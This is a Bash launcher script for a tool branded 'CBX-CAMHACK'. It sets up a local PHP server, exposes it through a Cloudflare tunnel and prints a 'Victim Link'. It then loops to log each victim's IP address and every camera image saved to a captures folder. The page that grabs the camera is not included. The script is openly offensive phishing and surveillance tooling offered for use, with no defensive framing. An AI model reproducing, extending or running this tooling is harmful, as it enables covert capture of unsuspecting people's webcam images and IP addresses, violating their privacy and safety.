#!/bin/bash

clear
echo -e "\e[1;31m"
echo " ▄████▄   ██▓███   ██▒   █▓ ▄▄▄       ██▀███   ▒█████   ▒█████   ██ ▄█▀"
echo "▒██▀ ▀█  ▓██░  ██▒▓██░   █▒▒████▄    ▓██ ▒ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ "
echo "▒▓█    ▄ ▓██░ ██▓▒ ▓██  █▒░▒██  ▀█▄  ▓██ ░▄█ ▒▒██░  ██▒▒██░  ██▒▓███▄░ "
echo "▒▓▓▄ ▄██▒▒██▄█▓▒ ▒  ▒██ █░░░██▄▄▄▄██ ▒██▀▀█▄  ▒██   ██░▒██   ██░▓██ █▄ "
echo "▒ ▓███▀ ░▒██▒ ░  ░   ▒▀█░   ▓█   ▓██▒░██▓ ▒██▒░ ████▓▒░░ ████▓▒░▒██▒ █▄"
echo "░ ░▒ ▒  ░▒▓▒░ ░  ░   ░ ▐░   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒"
echo "  ░  ▒   ░▒ ░        ░ ░░    ▒   ▒▒ ░  ░▒ ░ ▒░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░"
echo "░        ░░            ░░    ░   ▒     ░░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░ "
echo "░ ░                  ░         ░  ░   ░         ░ ░      ░ ░  ░  ░   ░ "
echo -e "\e[1;35m           👁️‍🗨️ CBX-CAMHACK by Zombie Noyon\e[0m"
echo -e "\e[1;36m               TikTok: @cbx.noyon\e[0m"
echo -e "\e[1;33m═══════════════════════════════════════════════\e[0m"
echo -e "\e[1;31m[1]\e[0m Install Required Packages"
echo -e "\e[1;31m[2]\e[0m Launch Deadly Camera Hack (Start Tool)"
echo -e "\e[1;31m[3]\e[0m Exit to Darkness"
echo -e "\e[1;33m═══════════════════════════════════════════════\e[0m"
read -p $'\e[1;32m⚔️ Choose your destiny: \e[0m' option

if [[ "$option" == "1" ]]; then
  echo -e "\e[1;34m[*] Installing tools of destruction...\e[0m"
  pkg update -y && pkg install php curl wget openssh cloudflared -y
  echo -e "\e[1;32m[*] All weapons installed. Press enter to continue...\e[0m"
  read
  bash start.sh

elif [[ "$option" == "2" ]]; then
  echo > .captured.log
  echo 0 > victim_clicks.txt
  mkdir -p captures
  echo -e "\e[1;34m[☠️] Summoning dark server on port 8080...\e[0m"
  php -S 127.0.0.1:8080 > /dev/null 2>&1 &
  sleep 2

  if ! pgrep -f "php -S 127.0.0.1:8080" > /dev/null; then
    echo -e "\e[1;31m[💀] PHP server died. Ritual failed. Exiting...\e[0m"
    exit 1
  fi

  echo -e "\e[1;34m[⚡] Opening shadow tunnel via Cloudflare...\e[0m"
  cloudflared tunnel --url http://127.0.0.1:8080 > .cld.log 2>&1 &

  echo -e "\e[1;33m[*] Awaiting portal link...\e[0m"
  for i in {1..30}; do
    link=$(grep -o 'https://[-a-zA-Z0-9@:%._\+~#=]\{1,\}\.trycloudflare\.com' .cld.log | head -n 1)
    if [[ ! -z "$link" ]]; then
      break
    fi
    sleep 1
  done

  if [[ -z "$link" ]]; then
    echo -e "\e[1;31m[🔥] Cloudflare failed to open the portal. Check internet.\e[0m"
    exit 1
  fi

  echo -e "\e[1;32m[🎯] Victim Link Generated: $link\e[0m"
  echo -e "\e[1;35m[🔍] Monitoring... Waiting for lost souls (victims)...\e[0m"

  known_ips=()
  last_capture=""

  while true; do
    # Show new IP
    if [[ -f ip.txt ]]; then
      ip=$(cat ip.txt)
      if [[ ! " ${known_ips[@]} " =~ " ${ip} " ]]; then
        echo -e "\e[1;91m[💀] New Victim IP: $ip\e[0m"
        known_ips+=("$ip")
      fi
      clicks=$(cat victim_clicks.txt)
      clicks=$((clicks + 1))
      echo $clicks > victim_clicks.txt
      echo -e "\e[1;33m[⚠️] Total Cursed Clicks: $clicks\e[0m"
      rm ip.txt
    fi

    # Show new captured images
    latest=$(ls captures 2>/dev/null | tail -n 1)
    if [[ "$latest" != "$last_capture" && -n "$latest" ]]; then
      time=$(date +"%T")
      echo -e "\e[1;36m[📸] Captured Image: $latest at $time\e[0m"
      last_capture="$latest"
    fi

    sleep 1
  done

elif [[ "$option" == "3" ]]; then
  echo -e "\e[1;31m[☠️] Exiting CBX-CAMHACK. Shadows remain...\e[0m"
  exit
else
  echo -e "\e[1;31m[❌] Invalid dark choice! Try again...\e[0m"
fi
